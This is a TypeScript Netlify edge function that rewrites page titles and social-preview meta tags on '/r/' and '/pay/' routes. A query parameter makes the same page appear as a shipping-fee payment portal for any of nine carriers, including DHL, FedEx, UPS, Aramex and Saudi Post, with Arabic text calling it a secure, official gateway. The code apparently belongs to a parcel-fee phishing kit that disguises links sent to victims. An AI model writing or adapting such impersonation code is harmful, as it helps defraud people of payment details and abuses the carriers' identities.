import type { Context } from "https://edge.netlify.com";

export default async (request: Request, context: Context) => {
  const url = new URL(request.url);
  const pathname = url.pathname;
  
  // Only process payment-related routes
  if (!pathname.startsWith('/r/') && !pathname.startsWith('/pay/')) {
    return;
  }

  // Company mapping
  const companyMeta: Record<string, { title: string; description: string; image: string }> = {
    'aramex': {
      title: 'Aramex - دفع رسوم الشحن والتوصيل',
      description: 'إكمال دفع رسوم الشحن لخدمة أرامكس السريعة. دفع آمن ومضمون لشحناتك الدولية والمحلية',
      image: '/og-aramex.jpg'
    },
    'dhl': {
      title: 'DHL - دفع فاتورة الشحن السريع',
      description: 'استكمال دفع فاتورة DHL Express. نظام دفع آمن لخدمات الشحن الدولي والمحلي السريع',
      image: '/og-dhl.jpg'
    },
    'fedex': {
      title: 'FedEx - دفع رسوم الشحن والتخليص',
      description: 'دفع فاتورة FedEx Express بطريقة آمنة وسريعة. خدمات الدفع الإلكتروني لشحناتك العالمية',
      image: '/og-fedex.jpg'
    },
    'ups': {
      title: 'UPS - تسديد رسوم الشحن',
      description: 'إتمام الدفع لخدمات UPS للشحن السريع. نظام دفع إلكتروني آمن ومعتمد',
      image: '/og-ups.jpg'
    },
    'smsa': {
      title: 'SMSA Express - تسديد رسوم الشحن',
      description: 'دفع رسوم شركة سمسا للشحن السريع. بوابة الدفع الآمنة لخدمات الشحن داخل المملكة وخارجها',
      image: '/og-smsa.jpg'
    },
    'empost': {
      title: 'البريد الإماراتي - دفع رسوم الخدمة البريدية',
      description: 'دفع رسوم البريد الإماراتي Emirates Post. نظام الدفع الرسمي للخدمات البريدية في الإمارات',
      image: '/og-empost.jpg'
    },
    'zajil': {
      title: 'زاجل - دفع رسوم التوصيل السريع',
      description: 'استكمال دفع رسوم شركة زاجل للشحن. نظام دفع إلكتروني آمن للشحنات داخل السعودية',
      image: '/og-zajil.jpg'
    },
    'naqel': {
      title: 'ناقل اكسبريس - دفع رسوم الشحن',
      description: 'تسديد رسوم شركة ناقل للخدمات اللوجستية. بوابة الدفع المعتمدة لخدمات الشحن السريع',
      image: '/og-naqel.jpg'
    },
    'saudipost': {
      title: 'البريد السعودي - دفع الرسوم البريدية',
      description: 'دفع رسوم البريد السعودي بشكل آمن. بوابة الدفع الرسمية للخدمات البريدية في المملكة',
      image: '/og-saudipost.jpg'
    }
  };

  // Extract company from URL query parameter
  const companyParam = url.searchParams.get('company');
  const company = companyParam?.toLowerCase() || 'aramex';
  const meta = companyMeta[company] || companyMeta['aramex'];

  // Get the response
  const response = await context.next();
  const html = await response.text();
  
  // Inject meta tags
  const origin = url.origin;
  const fullImageUrl = `${origin}${meta.image}`;
  
  const modifiedHtml = html
    .replace(
      /<meta property="og:title" content="[^"]*" \/>/,
      `<meta property="og:title" content="${meta.title}" />`
    )
    .replace(
      /<meta property="og:description" content="[^"]*" \/>/,
      `<meta property="og:description" content="${meta.description}" />`
    )
    .replace(
      /<meta property="og:image" content="[^"]*" \/>/,
      `<meta property="og:image" content="${fullImageUrl}" />`
    )
    .replace(
      /<meta name="twitter:image" content="[^"]*" \/>/,
      `<meta name="twitter:image" content="${fullImageUrl}" />`
    )
    .replace(
      /<meta name="twitter:title" content="[^"]*" \/>/,
      `<meta name="twitter:title" content="${meta.title}" />`
    )
    .replace(
      /<meta name="twitter:image:alt" content="[^"]*" \/>/,
      `<meta name="twitter:image:alt" content="${meta.title}" />`
    )
    .replace(
      /<title>[^<]*<\/title>/,
      `<title>${meta.title}</title>`
    );

  return new Response(modifiedHtml, {
    headers: {
      ...response.headers,
      'content-type': 'text/html; charset=utf-8',
    },
  });
};

export const config = {
  path: ["/r/*", "/pay/*"]
};
